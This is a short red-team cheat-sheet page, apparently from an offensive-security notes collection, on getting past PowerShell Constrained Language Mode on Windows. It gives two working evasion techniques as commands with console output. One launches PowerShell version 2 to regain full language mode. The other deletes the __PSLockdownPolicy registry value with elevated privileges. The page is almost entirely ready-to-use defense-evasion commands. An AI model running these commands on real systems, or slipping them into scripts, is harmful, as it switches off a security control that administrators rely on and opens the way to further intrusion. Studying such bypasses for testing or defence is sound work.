---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/defense-evasion/security-control/clm
---

# CLM

## Downgrade PowerShell

```powershell
PS C:\> powershell -v 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\> $ExecutionContext.SessionState.LanguageMode
FullLanguage
PS C:\> [System.Console]::WriteLine("Test")
Test
```

### Remove CLM via Register (Require Elevated Privilege)

```powershell
Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -Name __PSLockdownPolicy
```
